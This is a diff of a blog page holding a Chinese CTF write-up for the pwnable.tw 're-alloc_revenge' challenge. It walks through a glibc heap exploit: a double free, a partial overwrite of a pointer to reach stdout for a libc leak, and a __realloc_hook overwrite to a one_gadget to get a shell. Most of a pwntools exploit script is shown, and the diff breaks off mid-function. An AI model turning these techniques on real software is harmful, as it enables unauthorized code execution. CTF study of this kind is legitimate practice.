@@ -1,152 +1,30 @@
-<!doctype html><html lang=zh-cn>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
-<title>pwnable.tw re-alloc_revenge - hhdx's blog</title>
-<meta name=renderer content="webkit">
-<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta http-equiv=cache-control content="no-transform">
-<meta http-equiv=cache-control content="no-siteapp">
-<meta name=theme-color content="#f8f5ec">
-<meta name=msapplication-navbutton-color content="#f8f5ec">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
-<meta name=author content="hhdx"><meta name=description content="题目分析 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>pwnable.tw re-alloc_revenge - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="题目分析 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
 总体思路 程序没有show函数，所以通过修改stdout的方式泄露libc。
 将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
 最后修改__realloc_hook为one_gadget得到shell。
 主要难点在布局构造。
-"><meta name=keywords content="C language,CTF,system engineer">
-<meta name=generator content="Hugo 0.88.1 with theme even">
-<link rel=canonical href=https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/>
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
-<link rel=manifest href=/manifest.json>
-<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
-<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
-<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
-<meta property="og:title" content="pwnable.tw re-alloc_revenge">
-<meta property="og:description" content="题目分析
+"><meta name=keywords content="C language,CTF,system engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="pwnable.tw re-alloc_revenge"><meta property="og:description" content="题目分析
 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
 总体思路
 程序没有show函数，所以通过修改stdout的方式泄露libc。
 将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
 最后修改__realloc_hook为one_gadget得到shell。
-主要难点在布局构造。">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/"><meta property="article:section" content="post">
-<meta property="article:published_time" content="2020-09-07T14:48:20+00:00">
-<meta property="article:modified_time" content="2020-09-07T14:48:20+00:00">
-<meta itemprop=name content="pwnable.tw re-alloc_revenge">
-<meta itemprop=description content="题目分析
+主要难点在布局构造。"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-09-07T14:48:20+00:00"><meta property="article:modified_time" content="2020-09-07T14:48:20+00:00"><meta itemprop=name content="pwnable.tw re-alloc_revenge"><meta itemprop=description content="题目分析
 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
 总体思路
 程序没有show函数，所以通过修改stdout的方式泄露libc。
 将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
 最后修改__realloc_hook为one_gadget得到shell。
-主要难点在布局构造。"><meta itemprop=datePublished content="2020-09-07T14:48:20+00:00">
-<meta itemprop=dateModified content="2020-09-07T14:48:20+00:00">
-<meta itemprop=wordCount content="861">
-<meta itemprop=keywords content="CTF,"><meta name=twitter:card content="summary">
-<meta name=twitter:title content="pwnable.tw re-alloc_revenge">
-<meta name=twitter:description content="题目分析
+主要难点在布局构造。"><meta itemprop=datePublished content="2020-09-07T14:48:20+00:00"><meta itemprop=dateModified content="2020-09-07T14:48:20+00:00"><meta itemprop=wordCount content="861"><meta itemprop=keywords content="CTF,"><meta name=twitter:card content="summary"><meta name=twitter:title content="pwnable.tw re-alloc_revenge"><meta name=twitter:description content="题目分析
 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
 总体思路
 程序没有show函数，所以通过修改stdout的方式泄露libc。
 将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
 最后修改__realloc_hook为one_gadget得到shell。
 主要难点在布局构造。"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
-<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
-</head>
-<body>
-<div id=mobile-navbar class=mobile-navbar>
-<div class=mobile-header-logo>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<div class=mobile-navbar-icon>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
 <span></span>
-<span></span>
-<span></span>
-</div>
-</div>
-<nav id=mobile-menu class="mobile-menu slideout-menu">
-<ul class=mobile-menu-list>
-<a href=/>
-<li class=mobile-menu-item>Home</li>
-</a><a href=/post/>
-<li class=mobile-menu-item>Archives</li>
-</a><a href=/tags/>
-<li class=mobile-menu-item>Tags</li>
-</a><a href=/links/>
-<li class=mobile-menu-item>Links</li>
-</a><a href=/about/>
-<li class=mobile-menu-item>About</li>
-</a>
-</ul>
-</nav>
-<div class=container id=mobile-panel>
-<header id=header class=header>
-<div class=logo-wrapper>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<nav class=site-navbar>
-<ul id=menu class=menu>
-<li class=menu-item>
-<a class=menu-item-link href=/>Home</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/post/>Archives</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/tags/>Tags</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/links/>Links</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/about/>About</a>
-</li>
-</ul>
-</nav>
-</header>
-<main id=main class=main>
-<div class=content-wrapper>
-<div id=content class=content>
-<article class=post>
-<header class=post-header>
-<h1 class=post-title>pwnable.tw re-alloc_revenge</h1>
-<div class=post-meta>
-<span class=post-time> 2020-09-07 </span>
-</div>
-</header>
-<div class=post-toc id=post-toc>
-<h2 class=post-toc-title>文章目录</h2>
-<div class="post-toc-content always-active">
-<nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#题目分析>题目分析</a></li>
-<li><a href=#总体思路>总体思路</a></li>
-<li><a href=#partial-overwrite指向stdout>partial overwrite指向stdout</a></li>
-<li><a href=#tips>tips</a></li>
-<li><a href=#exploit>exploit</a></li>
-<li><a href=#ref>ref</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</div>
-<div class=post-content>
-<h2 id=题目分析>题目分析</h2>
-<p>防护比<a href=https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/>re-alloc</a>多了FULL RELRO和PIE。其他没有改变。</p>
-<h2 id=总体思路>总体思路</h2>
-<p>程序没有show函数，所以通过修改stdout的方式泄露libc。</p>
-<p>将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。</p>
-<p>最后修改<code>__realloc_hook</code>为one_gadget得到shell。</p>
-<p>主要难点在布局构造。</p>
-<h2 id=partial-overwrite指向stdout>partial overwrite指向stdout</h2>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/links/><li class=mobile-menu-item>Links</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/links/>Links</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>pwnable.tw re-alloc_revenge</h1><div class=post-meta><span class=post-time>2020-09-07</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#题目分析>题目分析</a></li><li><a href=#总体思路>总体思路</a></li><li><a href=#partial-overwrite指向stdout>partial overwrite指向stdout</a></li><li><a href=#tips>tips</a></li><li><a href=#exploit>exploit</a></li><li><a href=#ref>ref</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=题目分析>题目分析</h2><p>防护比<a href=https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/>re-alloc</a>多了FULL RELRO和PIE。其他没有改变。</p><h2 id=总体思路>总体思路</h2><p>程序没有show函数，所以通过修改stdout的方式泄露libc。</p><p>将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。</p><p>最后修改<code>__realloc_hook</code>为one_gadget得到shell。</p><p>主要难点在布局构造。</p><h2 id=partial-overwrite指向stdout>partial overwrite指向stdout</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -173,44 +51,34 @@
 </span><span class=lnt>25
 </span><span class=lnt>26
 </span><span class=lnt>27
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># 将chunk(0x70)分割成0x20和0x50的两块，造成overlap</span>
-<span class=c1># 便于后续修改chunk(0x50)的size</span>
-<span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
-<span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-<span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
-<span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-<span class=c1># double free chunk(0x50)</span>
-<span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
-<span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-<span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
-<span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-<span class=c1># 修改chunk(0x50)的size</span>
-<span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span>
-<span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>))</span>
-<span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-<span class=c1># bypass prev_inuse(nextchunk) check in free function</span>
-<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-<span class=c1># free to unsorted bin</span>
-<span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-<span class=c1># partial overwrite to stdout</span>
-<span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xa7</span><span class=s2>&#34;</span><span class=p>)</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=tips>tips</h2>
-<p>本地写exploit的时候，可以在process中指定参数<code>aslr=False</code>，禁用随机化，避免爆破，便于调试。</p>
-<h2 id=exploit>exploit</h2>
-<p><a href=https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc_revenge/exp.py>exp</a></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 将chunk(0x70)分割成0x20和0x50的两块，造成overlap</span>
+</span></span><span class=line><span class=cl><span class=c1># 便于后续修改chunk(0x50)的size</span>
+</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># double free chunk(0x50)</span>
+</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 修改chunk(0x50)的size</span>
+</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># bypass prev_inuse(nextchunk) check in free function</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># free to unsorted bin</span>
+</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># partial overwrite to stdout</span>
+</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xa7</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=tips>tips</h2><p>本地写exploit的时候，可以在process中指定参数<code>aslr=False</code>，禁用随机化，避免爆破，便于调试。</p><h2 id=exploit>exploit</h2><p><a href=https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc_revenge/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
 </span><span class=lnt>  2
 </span><span class=lnt>  3
 </span><span class=lnt>  4
@@ -346,223 +214,158 @@
 </span><span class=lnt>134
 </span><span class=lnt>135
 </span><span class=lnt>136
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
-
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-
-<span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
-<span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./re-alloc_revenge&#34;</span>
-<span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
-<span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
-<span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
-
-<span class=k>def</span> <span class=nf>allocate</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Data:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
-
-<span class=k>def</span> <span class=nf>realloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
-    <span class=k>if</span> <span class=n>size</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
-        <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Data:&#34;</span><span class=p>)</span>
-        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
-
-<span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
-
-<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
-    <span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x106ef8</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
-
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span>
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>))</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
-        <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
-        <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
-        <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-    
-    <span class=c1># 0x60 count++</span>
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xa7</span><span class=s2>&#34;</span><span class=p>)</span>
-    <span class=c1># gdb.attach(io, &#34;&#34;&#34;b menu</span>
-    <span class=c1># b read_input</span>
-    <span class=c1># &#34;&#34;&#34;)</span>
-    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=p>)</span>
-    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=p>)</span>
-    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
